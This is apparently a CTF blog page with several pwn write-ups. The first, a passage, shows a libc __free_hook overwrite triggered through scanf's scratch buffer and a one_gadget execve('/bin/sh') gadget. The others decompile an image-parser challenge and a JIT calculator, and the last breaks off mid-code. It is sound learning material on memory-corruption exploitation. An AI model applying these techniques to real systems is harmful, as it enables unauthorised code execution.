<p>Yep, the entire allocation has moved elsewhere. But where exactly?</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125355554-1644bf80-e35d-11eb-815f-2b095fd3f45e.png" alt="image" /></p>

<p>Our allocation is between the main heap and libc (<code class="language-plaintext highlighter-rouge">0x7ffff7deb000-0x7ffff7e0c000</code>). The most important aspect of this is that there is no flux/influence of ASLR between our heap
and all of libc. This means:</p>

<ul>
  <li>Since our heap is at a constant offset from libc, so is our leaked allocation address. We now have an easy way to get the base, and therefore the rest of libc.</li>
  <li>As stated in the above, our allocation is at a constant offset from libc, this means that we may use our primitive to write INTO libc, anywhere we want.</li>
</ul>

<p>Now that we have easy access to libc, we need a place to write. I tried a couple things here; none of which worked, however overwriting <code class="language-plaintext highlighter-rouge">__free_hook</code> did.</p>

<p><code class="language-plaintext highlighter-rouge">__free_hook</code> is a global function pointer in libc that when NULL does nothing however when populated with any values, upon <code class="language-plaintext highlighter-rouge">free()</code> it will detect that the pointer is not 
NULL and instead jump to it. This makes it ideal, as <code class="language-plaintext highlighter-rouge">free()</code>, and therefore <code class="language-plaintext highlighter-rouge">__free_hook</code> are used alot more than you would expect, and so there are alot of opportunities for 
RCE with this value. Hooks like this also exist for <code class="language-plaintext highlighter-rouge">malloc()</code> and <code class="language-plaintext highlighter-rouge">realloc()</code> functions, making it an extremely easy way to execute a one-gadget in a pinch.</p>

<p>We can work out the difference of <code class="language-plaintext highlighter-rouge">__free_hook</code> from our allocation, then divide that by 8, ensuring that when it eventually gets multiplied by 8 in our 
<code class="language-plaintext highlighter-rouge">scanf("%zu",(void *)((long)alloc + size * 8)))</code> we still come out with the same value:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125357942-3629b280-e360-11eb-88c3-1abc4c729304.png" alt="image" /></p>

<p>We can then do a test run in gdb to make sure we are in fact writing to the correct location</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125358108-68d3ab00-e360-11eb-88bb-badc3cfdbbcb.png" alt="image" /></p>

<p>And sure enough, yes.</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125358179-7f7a0200-e360-11eb-865f-bcc35d4836cc.png" alt="image" /></p>

<p>We can see that we do write to <code class="language-plaintext highlighter-rouge">__free_hook</code>. However on entering a random value you’ll notice that we do not SEGFAULT before the <code class="language-plaintext highlighter-rouge">_exit()</code></p>

<p><img src="https://user-images.githubusercontent.com/73792438/125358554-f44d3c00-e360-11eb-91f0-1ebd8d089d9f.png" alt="image" /></p>

<p>This can mean only one thing; our input is never allocated / is never <code class="language-plaintext highlighter-rouge">free()</code>‘d</p>

<h1 id="some-scanf-stuff">Some scanf stuff</h1>

<p>Since <code class="language-plaintext highlighter-rouge">scanf()</code> takes no <code class="language-plaintext highlighter-rouge">length</code> field, for all user input, even the stuff it doesnt care about (wrong format, wrong type, etc…) it has to take + store somehow. To do this
it uses a ‘scratch’-buffer. This is a buffer that will store ALL the input from <code class="language-plaintext highlighter-rouge">scanf()</code>. This starts as a stack buffer, however will fallback to being a heap buffer if this 
stack buffer threatens to overflow:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/*</span> <span class="n">Scratch</span> <span class="n">buffers</span> <span class="n">with</span> <span class="n">a</span> <span class="k">default</span> <span class="n">stack</span> <span class="n">allocation</span> <span class="n">and</span> <span class="n">fallback</span> <span class="n">to</span>
   <span class="n">heap</span> <span class="n">allocation</span><span class="p">.</span> <span class="p">[</span><span class="o">---</span><span class="n">snipped</span><span class="o">---</span><span class="p">]</span>
</code></pre></div></div>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.28.9000/source/include/scratch_buffer.h#L22">here</a></p>

<p>This heap buffer is re-used whenever another call to <code class="language-plaintext highlighter-rouge">scanf()</code> comes via rewinding the buffer position back to the start, such that the space can be re-used:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Reinitializes BUFFER-&gt;current and BUFFER-&gt;end to cover the entire
   scratch buffer.  */</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span>
<span class="nf">char_buffer_rewind</span> <span class="p">(</span><span class="k">struct</span> <span class="n">char_buffer</span> <span class="o">*</span><span class="n">buffer</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">current</span> <span class="o">=</span> <span class="n">char_buffer_start</span> <span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
  <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">end</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">current</span> <span class="o">+</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">scratch</span><span class="p">.</span><span class="n">length</span> <span class="o">/</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">CHAR_T</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.28.9000/source/stdio-common/vfscanf.c#L216">here</a> and <a href="https://elixir.bootlin.com/glibc/glibc-2.28.9000/source/stdio-common/vfscanf.c#L483">here</a></p>

<p>Whenever we want to add to this buffer, we need to call <code class="language-plaintext highlighter-rouge">char_buffer_add()</code>. This does a couple things. 1st it checks if we currently positioned at the end of our buffer, and 
if so it will take a ‘slow’ path. Otherwise it just adds a single character to the scratch buffer and moves on:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span>
<span class="nf">char_buffer_add</span> <span class="p">(</span><span class="k">struct</span> <span class="n">char_buffer</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="n">CHAR_T</span> <span class="n">ch</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">current</span> <span class="o">==</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">end</span><span class="p">))</span>
    <span class="n">char_buffer_add_slow</span> <span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">ch</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="o">*</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">current</span><span class="o">++</span> <span class="o">=</span> <span class="n">ch</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.28.9000/source/stdio-common/vfscanf.c#L256">here</a></p>

<p>As you would expect, the slow path is for when we run out of space in our stack buffer, (or our heap buffer) and will move our input in its entirety to the heap when the 
conditions are right</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Slow path for char_buffer_add.  */</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">char_buffer_add_slow</span> <span class="p">(</span><span class="k">struct</span> <span class="n">char_buffer</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="n">CHAR_T</span> <span class="n">ch</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">char_buffer_error</span> <span class="p">(</span><span class="n">buffer</span><span class="p">))</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">end</span> <span class="o">-</span> <span class="p">(</span><span class="n">CHAR_T</span> <span class="o">*</span><span class="p">)</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">scratch</span><span class="p">.</span><span class="n">data</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">scratch_buffer_grow_preserve</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">scratch</span><span class="p">))</span> <span class="c1">// &lt;--------- important part is here</span>
    <span class="p">{</span>
      <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">current</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">end</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="n">char_buffer_rewind</span> <span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
  <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">current</span> <span class="o">+=</span> <span class="n">offset</span><span class="p">;</span>
  <span class="o">*</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">current</span><span class="o">++</span> <span class="o">=</span> <span class="n">ch</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>If we delve a bit deeper we can actually find where exactly this allocation happens:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bool</span>
<span class="nf">__libc_scratch_buffer_grow_preserve</span> <span class="p">(</span><span class="k">struct</span> <span class="n">scratch_buffer</span> <span class="o">*</span><span class="n">buffer</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">new_length</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">new_ptr</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">buffer</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">==</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">__space</span><span class="p">.</span><span class="n">__c</span><span class="p">)</span> <span class="c1">// If we are currently using the __space.__c buffer (stack buffer). This is the default for all inputs, initially.</span>
    <span class="p">{</span>
      <span class="cm">/* Move buffer to the heap.  No overflow is possible because
	 buffer-&gt;length describes a small buffer on the stack.  */</span>
      <span class="n">new_ptr</span> <span class="o">=</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">new_length</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">new_ptr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	      <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
      <span class="n">memcpy</span> <span class="p">(</span><span class="n">new_ptr</span><span class="p">,</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">__space</span><span class="p">.</span><span class="n">__c</span><span class="p">,</span> <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span> <span class="c1">// heres the 'move'</span>
<span class="c1">// [---snipped---]</span>
      <span class="cm">/* Install new heap-based buffer.  */</span>
  <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">new_ptr</span><span class="p">;</span>
  <span class="n">buffer</span><span class="o">-&gt;</span><span class="n">length</span> <span class="o">=</span> <span class="n">new_length</span><span class="p">;</span>
  <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">buffer-&gt;data</code> is where we write into the scratch buffer - at least the origin, anyway.</p>

<p>From this we can understand that if we provide enough input - enough that we can progress the <code class="language-plaintext highlighter-rouge">buffer-&gt;current</code> to the <code class="language-plaintext highlighter-rouge">buffer-&gt;end</code> of the current buffer , we can 
trigger a new allocation with <code class="language-plaintext highlighter-rouge">malloc()</code>. This has some caveats though; if <code class="language-plaintext highlighter-rouge">scanf()</code> expects a number (like with our <code class="language-plaintext highlighter-rouge">__isoc99_scanf("%zu...</code>) it will only progress the 
<code class="language-plaintext highlighter-rouge">buffer-&gt;current</code> if it recieves a digit. You can read the source here <a href="https://elixir.bootlin.com/glibc/glibc-2.28.9000/source/stdio-common/vfscanf.c#L1396">here</a>.</p>

<p>One thing I want to draw your attention to though, is this:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="p">{</span>
<span class="c1">// [---snipped---]</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">ISDIGIT</span> <span class="p">(</span><span class="n">c</span><span class="p">))</span>
		<span class="p">{</span>
		  <span class="n">char_buffer_add</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">charbuf</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
		  <span class="n">got_digit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
		<span class="p">}</span>
<span class="c1">// [---snipped---]</span>
</code></pre></div></div>

<p>What we have here, is what I assume to be the loop that goes through the values of each number, after the format string has been interpreted (but you can never be sure with libc 
code). As you can see, if our character is a digit, we add it to the buffer. Cool.</p>

<p>Now armed with this (somewhat useless) knowledge, we can go back and try writing to <code class="language-plaintext highlighter-rouge">__free_hook</code> again, but this time with at least 1024 bytes of digits in our buffer
in order to allocate a chunk that will be free’d on exiting <code class="language-plaintext highlighter-rouge">scanf()</code> (via <code class="language-plaintext highlighter-rouge">scratch_buffer_free()</code>) And sure enough if we spam ‘0’s, we can call <code class="language-plaintext highlighter-rouge">free()</code> on our allocation and thus trigger 
<code class="language-plaintext highlighter-rouge">__free_hook</code>:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125519774-a9246a30-4760-4c5f-8cfa-7482964f23be.png" alt="image" /></p>

<p>Now when we test in gdb:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125519937-eb6b539a-c8f9-4c18-acc3-2ae774ccb9d6.png" alt="image" /></p>

<p>Boom.</p>

<p>Its worth noting that using any digit other than ‘0’ will (stating the obvious a bit here) cause the value to wrap around and become <code class="language-plaintext highlighter-rouge">0xffffffffffffffff</code>. But leading
with ‘0’s ensures that the value written is not changed (I got confused with this for a while lol).</p>

<h1 id="exploitation">Exploitation</h1>

<p>Now that we have an RIP overwrite with a value we completely control AND a libc leak, the next logical step was finding an applicable <code class="language-plaintext highlighter-rouge">one_gadget</code> we can use. Running
<code class="language-plaintext highlighter-rouge">one_gadget</code> on our libc provides 3 results. The one that works is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x448a3 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
</code></pre></div></div>

<p>Now with that out of the way, things should be pretty EZ. Exploit is in the folder.
HTP.</p>


    <div class="more"><a href="/Simultaneity-writeup/">read more</a></div>
  </article>

  <article>
    <header>
  <h1><a href="/Image-identifier-writeup/">Image Identifier Writeup</a></h1><time datetime="2021-07-17T00:00:00+01:00">July 17, 2021</time>
</header>

    <h1 id="intro">Intro</h1>

<p>Heres the second one.</p>

<h2 id="description">Description</h2>

<p><img src="https://user-images.githubusercontent.com/73792438/125590627-6d60c007-9e4e-4a5d-9164-49e7fa3828e5.png" alt="image" /></p>

<p>Oddly enough I solved this challenge before <code class="language-plaintext highlighter-rouge">simultaneity</code>, despite this having less solves overall, probably due to its complexity. The description would suggest some 
sort of image parser (of course the name is <code class="language-plaintext highlighter-rouge">image-identifier</code>). So lets run it and see.</p>

<p>We are given a <code class="language-plaintext highlighter-rouge">Dockerfile</code> and a binary, <code class="language-plaintext highlighter-rouge">chal</code>. No libc this time so no need for any patching shenanigans. If we run <code class="language-plaintext highlighter-rouge">checksec</code> (like i forgot for <code class="language-plaintext highlighter-rouge">simultaneity</code>) we 
can see what our options will be:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125593030-b4bd38d7-8651-4af7-9a87-cb552b662bfc.png" alt="image" /></p>

<p>So PIE is off, and no libc is provided. That combined with having only Partial Relro means that the intended solution probably involves calling/overwriting some function
in the binary/Global Offset Table. If we run the program:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125593519-98e1de93-afd6-461e-83d1-5c52d68f1a82.png" alt="image" /></p>

<p>We can see it asks for the size of our image file. Upon supplying a size we can then supply our image content. Supplying some junk, predictably does nothing but make the
program complain about <code class="language-plaintext highlighter-rouge">unidentifiable format</code>, then exits. It seems we won’t be able to fully explore the program functionality unless we understand how to make an image
with an identifiable format, so lets crack it open in ghidra.</p>

<h1 id="reversing">Reversing</h1>

<p>Thankfully the file isn’t stripped (its a pwn challenge, not rev thank god) so we can still maintain some semblence of sanity. So whats in <code class="language-plaintext highlighter-rouge">main()</code>? Quite alot when 
compared to <code class="language-plaintext highlighter-rouge">simultaneity</code> (cant take a screenshot bcuz its too big, will just dump the code here):</p>

<p>```c
undefined8 main(void)</p>

<p>{
  int retval;
  long in_FS_OFFSET;
  char yes_no;
  int image_length;
  undefined4 invert_image_colours;
  int img_type;
  void *image_alloc;
  code **image_fops;
  long cookie;</p>

<p>cookie = <em>(long *)(in_FS_OFFSET + 0x28);
                      /</em> setup buffering for lil old me awww <em>/
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts(“welcome to the image identifier service\n”);
  puts(“How large is your file?\n”);
  retval = __isoc99_scanf(“%d”,&amp;image_length);
  if (retval != 1) {
                      /</em> supposedly ‘invalid’ file size but doesn’t bail out :) <em>/
    puts(“invalid file size”);
  }
                      /</em> malloc will return ‘0’ if it fails (aka, size too big). However this doesn’t
                         help us, AT ALL. <em>/
  image_alloc = malloc((long)image_length);
  getchar();
  image_fops = (code <strong>)malloc(0x18);
  puts(“please send your image here:\n”);
  fread(image_alloc,(long)image_length,1,stdin);
                      /* read from the start of our input/image to determine the type of image. From
                         here different fops will be used for each image type. */
  img_type = validateHeader(image_alloc);
                      /* No checks happen on the chunks/footer if we use bmp. Because the functions
                         are basically nops LMFAO. :( just realised my dumbass didn’t see that they
                         just exit() immediately. */
  if (img_type == 1) {
    *image_fops = bmpHeadValidate;
    image_fops[1] = bmpChunkValidate;
    image_fops[2] = bmpFooterValidate;
  }
  else {
    if (img_type != 2) {
      puts(“unidentifiable format”);
                      /* WARNING: Subroutine does not return */
      exit(1);
    }
                      /* However if we have the mis-fortune to use png, there are a myriad of checks
                         and fucky shit we have to do to get a valid file produced. */
    *image_fops = pngHeadValidate;
    image_fops[1] = pngChunkValidate;
    image_fops[2] = pngFooterValidate;
  }
                      /* generates a 256 byte-long sequence */
  make_crc_table();
                      /* ghidra fucked up the args. This will either be bmpHeadValidate() or
                         pngHeadValidate(). */
  retval = (</strong>image_fops)(image_alloc,image_length,image_length,</em>image_fops);
                      /* if the above is sucessful, we can increment image_alloc by 33 bytes. If our
                         allocation is smaller that that, we can write out of bounds n shit <em>/
  if (retval == 0) {
    puts(“valid header, processing chunks”);
                      /</em> Offset can be added to quite a bit, and if your allocation is only 16
                         bytes (minimum) this may be incremented out of bounds, and into the
                         image_fops array… Interesting… <em>/
    image_alloc = (void *)((long)image_alloc + (long)offset);
    invert_image_colours = 0;
    puts(“do you want to invert the colors?”);
    retval = __isoc99_scanf(“%c”,&amp;yes_no);
    if ((retval == 1) &amp;&amp; (yes_no == ‘y’)) {
      invert_image_colours = 1;
    }
    while ((ended == 0 &amp;&amp; ((long)image_alloc &lt; (long)image_fops))) {
                      /</em> until there are no chunks left to check. Also check that image_alloc doesn’t
                         get incremented out of bounds (but what if it already has been ;) ). <em>/
      image_alloc = (void *)(</em>image_fops[1])(image_alloc,invert_image_colours,invert_image_colours,
                                                   image_fops[1]);
    }
    (<em>image_fops[2])(image_alloc);
    puts(“congrats this is a great picture”);
    if (cookie != *(long *)(in_FS_OFFSET + 0x28)) {
                      /</em> WARNING: Subroutine does not return <em>/
      __stack_chk_fail();
    }
    return 0;
  }
                      /</em> WARNING: Subroutine does not return */
  exit(1);
}</p>

    <div class="more"><a href="/Image-identifier-writeup/">read more</a></div>
  </article>

  <article>
    <header>
  <h1><a href="/Calculator-writeup/">TamuCTF 21 Calculator writeup</a></h1><time datetime="2021-04-27T00:00:00+01:00">April 27, 2021</time>
</header>

    <p><a href="https://tamuctf.com">TamuCTF</a> Started last thursday, and took place over 3 days, ending on the 25th (Sunday). The CTF had many different categories, however since I only know (a little bit) pwn I found myself focusing on exclusively those challenges. Of those I managed to solve 8 out of the 11 available. One of these challenges was called <strong>Calculator</strong>.</p>
<h2 id="what-is-it">What is it?</h2>
<p>When doing CTF challenges/Attacking real targets, people generally say the first step you need to take is to understand the general functionality of the program, then you can understand where vulnerabilities <em>could</em> be found, so lets take a look:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116205887-1c4fda80-a736-11eb-8607-d8e346699349.PNG" alt="1" /></p>

<p>Looks like a calculator (duhh) but with the added feature that instead of just giving numbers and symbols (say “1+1”) then evaluating them, we use assembly-like syntax to specify the operation we want. Its sort of unfair to start this way, as I already knew that specifying ‘add’ would yeald results, so i’ll tell you that i spent ~10mins just messing around with the binary without delving too deep, so thats why I know.</p>

<p>The program has another option we didn’t use, being “Print Instructions”. Take a look:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116206992-4e157100-a737-11eb-9cb3-f057169ad64a.PNG" alt="2" /></p>

<p>So that just prints what we entered, cool. I think now we have a general idea of what the program does, and how to use it:</p>

<ul>
  <li>“Add instruction” adds an instruction to a buffer/list of commands, this can then be retrieved by “Print Instructions” for printing.</li>
  <li>“Print Instructions” lists out the commands/instructions we added through “Add instruction”.</li>
  <li>“Evaluate” does some magic and eventually spits out the result of our sum.</li>
</ul>

<p>Another thing we can do is try and enter some garbled mess into “Add Instruction” and see what happens:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116208160-84072500-a738-11eb-9910-357ed32e50c2.PNG" alt="3" /></p>

<p>As you can see, the program has to do some parsing of our input in “Evaluate”, and obviously doesn’t even try to interpret our string of ‘A’s.
Now we can get into the nitty gritty in ghidra to understand the <em>how</em> and <em>why</em> of this program.</p>

<h2 id="how">How?</h2>

<p>Starting in main, we see that the decompilation of this function looks very clean, so there is no need to look at ASM for the time being (phew):
(Note that I have added annotations to some of the source code in the other functions and renamed others, so the decompilation will be different on your side)</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116210149-84a0bb00-a73a-11eb-8e6d-8781f75f9cb4.PNG" alt="4" /></p>

<p>As you can see upon starting main we disable buffering for stdout with <code class="language-plaintext highlighter-rouge">setvbuf()</code>. This means we should get output from the program only when it sends it, and no-where
else. This makes it easier to recieve data when we program our exploit script later. We then <code class="language-plaintext highlighter-rouge">malloc()</code> some memory with the size of <code class="language-plaintext highlighter-rouge">(instruction_count + 1) &lt;&lt; 3</code> (an easier way to understand this is as <code class="language-plaintext highlighter-rouge">(instruction_count + 1) * 8</code>) and store a pointer to that memory in <code class="language-plaintext highlighter-rouge">instructions</code>.</p>

<p>We can already (correctly) speculate as to the purpose of these variables; the <code class="language-plaintext highlighter-rouge">instructions</code> variable holds a pointer to heap memory where our entered instructions are stored in some way, and <code class="language-plaintext highlighter-rouge">instruction_count</code> stores the number of instructions/commands entered, nice.</p>

<p>We then enter a command loop with <code class="language-plaintext highlighter-rouge">do {} while(True)</code> that will keep looping until we Ctrl+C/Kill the program another way, and contained inside this loop is code for our 3 choices. We can see some already recognisable functions names <code class="language-plaintext highlighter-rouge">add_instruction()</code> and <code class="language-plaintext highlighter-rouge">print_instruction()</code> which both do as you would expect. But then we see what happens for the 3rd choice, or “Evaluate”:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116214516-aef47780-a73e-11eb-915f-9fbecdedc74d.PNG" alt="5" /></p>

<p>‘Jit’ stands for ‘Just in Time’, and generally refers to a type of compilation. This would hint that maybe our simple calculator program is something a little more than
what it seems…</p>

<p>You may wonder why I have named the two variables ‘choice’ and ‘decision’ as such, when they are practically the same thing. This is because I lack creativity and couldn’t come up with any better names.</p>

<p>Anyway, we should start from the top. We can tackle the beast that is the <code class="language-plaintext highlighter-rouge">jit()</code> function once we understand how the others work, starting with <code class="language-plaintext highlighter-rouge">add_instruction()</code>.</p>

<h3 id="add_instruction">add_instruction()</h3>

<p>Again (thanks ghidra) the decompilation is very clean, so we can simply use it again. Before we do this I feel that its important to mention you shouldn’t always trust a decompiler to tell you the truth of things, I just found that it was perfect for this challenge, but don’t make it a habit. Anyway:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116218998-05fc4b80-a743-11eb-8403-041e05a9e0d2.PNG" alt="6" /></p>

<p>Here’s where my nonsensical annotations begin, and never stop lul. Firstly, the function allocates <code class="language-plaintext highlighter-rouge">0x1e</code> (30) bytes of space, initialises it with zeros using <code class="language-plaintext highlighter-rouge">memset()</code> and then reads into this memory from <code class="language-plaintext highlighter-rouge">stdin</code>. So any given command can be a max of <code class="language-plaintext highlighter-rouge">0x1e</code> bytes long, cool.</p>

<p>We then store a pointer to our input in the area allocated for holding <code class="language-plaintext highlighter-rouge">instructions</code> (recall that the area allocated is <code class="language-plaintext highlighter-rouge">(instruction_count + 1) * 8</code> big). This is actually where <code class="language-plaintext highlighter-rouge">print_instruction()</code> will look when trying to print out our instructions, so this snippet just stores a pointer to be dereferenced and printed later, but we will get there when we get there.</p>

<p>The program then sets <code class="language-plaintext highlighter-rouge">instruction_mem_size = instruction_count + 2</code> and increments <code class="language-plaintext highlighter-rouge">instruction_count</code>. The latter makes sense; of course whenever <code class="language-plaintext highlighter-rouge">add_instruction()</code> is called we expect to add another instruction, but what is the purpose of <code class="language-plaintext highlighter-rouge">instruction_mem_size</code> being incremented? Well if we look a little further on we can see it being used to malloc some space: <code class="language-plaintext highlighter-rouge">__dest = malloc((long)instruction_mem_size &lt;&lt; 3);</code> and then into said space is copied the contents of the <code class="language-plaintext highlighter-rouge">instructions</code> heap memory. Since we increment it by 2, rather than just 1, this gives us an extra “1*8” in space. This space is then used to store the pointer to our input that is used by <code class="language-plaintext highlighter-rouge">print_instruction()</code>.</p>

<p>Now the program <code class="language-plaintext highlighter-rouge">free()</code>s the <code class="language-plaintext highlighter-rouge">instructions</code> memory, and sets it to the new pointer to memory we just allocated, <code class="language-plaintext highlighter-rouge">__dest</code>.</p>

<p>So, to recap. Whenever we call <code class="language-plaintext highlighter-rouge">add_instruction()</code> we read an instruction/whatever happens to be sent via stdin into a heap buffer. A pointer to this buffer is then written
into the <code class="language-plaintext highlighter-rouge">instructions</code> heap memory, along with any other instruction buffers that may already be there. We than allocate another heap buffer that is equal to the size of the previous buffer + 8. Then we free the old heap buffer, and set <code class="language-plaintext highlighter-rouge">instructions</code> to the new memory. Here’s what that would look like in gdb:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116226666-2d571680-a74b-11eb-89f4-70edbf73364d.PNG" alt="7" /></p>

<p>With the address <code class="language-plaintext highlighter-rouge">0x5555555592a0</code> being the <code class="language-plaintext highlighter-rouge">__dest</code> pointer.</p>

<h3 id="print_instruction">print_instruction()</h3>

<p>Now we can have a breather, as this function should already be pretty farmiliar to you, its also quite simple:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116227135-b40bf380-a74b-11eb-89dc-1369bddf80f3.PNG" alt="8" /></p>

<p>All it does is iterate through the <code class="language-plaintext highlighter-rouge">instructions</code> heap memory, dereferencing any pointers it may find and printing them. As I point out at the top, this will also print out any garbage we add to our instructions buffer, but this is mainly due to <code class="language-plaintext highlighter-rouge">add_instruction()</code> not doing any checks on whether our input is a valid instruction/command. This isn’t particularly important, just I would mention it.</p>

<h2 id="jit">jit()</h2>

<p>One of the hallmarks of a JIT compiler is that some language (such as python or javascript) is converted into Byte-code, and then that bytecode is then fed into an interpreter such as the python interpreter that then converts that bytecode into machine code and executes it. This program does implement JIT, although it takes out the bytecode and instead just converts our commands into machine code, lets take a look: 
(The function is too big for a screenshot so I will paste the decompiled code here)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">jit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">choice_1</span><span class="p">;</span>
  <span class="n">ulonglong</span> <span class="n">arg1</span><span class="p">;</span>
  <span class="kt">double</span> <span class="n">skipped_instructions_float</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">nullptr</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">skipped_instructions</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="n">undefined8</span> <span class="n">executed_code</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">instr_name</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">size_of_code</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">real_skipped_instructions</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iter</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="o">*</span><span class="n">code_ptr</span><span class="p">;</span>
  
  <span class="n">puts</span><span class="p">(</span><span class="s">"How many instructions would you like to skip?"</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">skipped_instructions</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
                    <span class="cm">/* converts string input from fgets() into an actual number so it can be used to
                       skip some instructions. Interestingly enough this is a float. Hmmmm.... */</span>
  <span class="n">skipped_instructions_float</span> <span class="o">=</span> <span class="n">atof</span><span class="p">(</span><span class="n">skipped_instructions</span><span class="p">);</span>
                    <span class="cm">/* each encoding of instructions = 13 bytes */</span>
  <span class="n">real_skipped_instructions</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">skipped_instructions_float</span> <span class="o">*</span> <span class="mi">13</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">size_of_code</span> <span class="o">=</span> <span class="n">instruction_count</span> <span class="o">*</span> <span class="mh">0xd</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>
                    <span class="cm">/* map some memory and store a pointer to the mapped area in 'code_ptr' */</span>
